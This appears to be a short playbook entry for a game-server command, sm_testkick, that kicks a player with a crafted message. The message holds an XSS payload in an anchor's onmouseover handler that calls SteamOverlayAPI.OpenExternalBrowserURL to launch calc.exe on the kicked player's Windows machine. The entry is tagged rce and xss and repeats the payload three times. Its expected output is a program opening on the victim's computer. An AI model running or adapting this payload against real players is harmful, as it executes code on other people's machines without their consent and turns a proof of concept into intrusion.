---
data: >-
  sm_testkick <a
  onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The
  remote host stopped receiving communications and closed the connection</a>
tags:
  - rce
  - xss
type: command
executor: bash
platforms:
  - Windows
id: 6d2b16b2-005e-4a86-9c59-710a1858ae49
created_at: '2025-12-11T06:10:15.640Z'
updated_at: '2025-12-11T06:10:15.640Z'
verified: false
validated: true
submitted: true
---
# sm-testkick-rce

## Command

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

## Description

Executes the testkick plugin to kick the player with an XSS payload that launches calc.exe on mouseover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `message` | Contains <a> tag with onmouseover event | Yes |

## Examples

### Basic Usage

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

## Expected Output

Opens Windows Calculator on victim's machine upon mouseover.

## Related

- [[procedures/Develop-and-Test-XSS-Kick-Plugin]]
